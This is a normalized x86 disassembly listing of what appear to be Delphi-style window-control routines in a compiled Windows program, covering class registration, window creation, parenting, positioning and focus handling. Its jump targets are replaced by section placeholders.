test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_445a4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4460d0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_446094
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_446094
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_445aa0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_445a4c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445b7f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4458dc
pop ecx
push ebp
mov al 0x2
call sub_4458dc
pop ecx
push ebp
mov al 0x3
call sub_4458dc
pop ecx
push ebp
mov al 0x4
call sub_4458dc
pop ecx
push ebp
mov al 0x5
call sub_4458dc
pop ecx
push ebp
mov al 0x6
call sub_4458dc
pop ecx
push ebp
xor eax eax
call sub_4458dc
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_445ba4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445c38
xor eax eax
push ebp
push sub_445c2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_445c68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445d2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4425bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d34
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446094
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a30c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_442328
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a468
xor ecx ecx
mov edx 0xb03e
call sub_443d6c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446094
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_445d3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4460d0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_445c38
xor edx edx
push ebp
push sub_445e23
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446094
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a30c
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_41a468
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446094
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_4420cc
mov dl 0x4
call sub_4420cc
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41a358
sub_445e90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4599ec
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45d710
sub_445eb0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4414ac
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4414ac
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4414ac
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_445efc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4414d4
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4414d4
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4414d4
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_445f44
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403430
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_443d6c
mov edx ebx
mov eax edi
call sub_445eb0
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_443d6c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443d6c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
call sub_4496dc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_443d6c
mov eax edi
call sub_446a94
jmp r-xdata
mov edx ebx
mov eax edi
call sub_445ba4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_446018
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_443d6c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax esi
call sub_4496dc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_445e90
mov eax ebp
call sub_4468f8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_445efc
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_443d6c
mov eax esi
call sub_445c60
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_443000
sub_446094
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_41a468
mov edx edi
mov eax ebp
call sub_41a468
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4460f0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_446094
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_446130
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4460f0
add esp 0x10
retn
sub_446158
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4461c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4431fc
test al al
je r-xdata
mov eax ebx
call sub_44322c
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403430
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403430
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44622c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44634a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c40
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4461c4
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4493d8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446351
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_446358
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_446519
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43f9ac
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43f9ac
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cfc8
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cfc8
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408bcc
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4496e8
push 0x1
mov eax [ esi + 0x68 ]
call sub_423ab8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_443d6c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4493d8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446520
lea eax [ ebp - 0xc0 ]
call sub_404008
retn
mov eax esi
mov si 0xffee
call sub_403430
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_446528
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406e1c
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_446568
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e69c
mov eax esi
call sub_41e5ec
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41e5ec
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41e6a4
pop esi
pop ebx
retn
sub_4465a0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41fee8
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41fe74
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41fe74
mov eax esi
call sub_41fef0
add esp 0x10
pop esi
pop ebx
retn
sub_446608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4465f4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a468
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a468
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4466e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4440a4
mov eax [ ebp - 0x8 ]
push eax
push sub_446568
mov eax [ ebp - 0x8 ]
push eax
push sub_4465a0
push ebp
call sub_446608
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44673c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442b2c
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408b80
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408b94
mov ecx eax
mov edx edi
mov eax ebx
call sub_442b3c
mov eax r-xdata
call sub_408ba0
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4415e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_446794
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4467e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4467e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cfc8
sub_4467f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41a4c4
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_41a468
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_446840
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4467f8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_446094
call sub_44220c
inc edi
dec esi
jne r-xdata
sub_4468dc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4468f8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_41a468
call sub_4468f8
inc edi
dec esi
jne r-xdata
sub_446958
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403430
mov ebx eax
mov eax edi
call sub_4468f8
mov eax edi
call sub_446a94
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_446998
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_446a6e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_443d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a468
call sub_446998
inc esi
dec ebx
jne r-xdata
sub_446a94
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446998
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_446ad4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4468f8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_446a94
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406e04
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443d6c
jmp r-xdata
sub_446b5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446bb4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_446ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446baa
call sub_4415e0
call sub_427f18
retn
sub_446bd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_41900c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
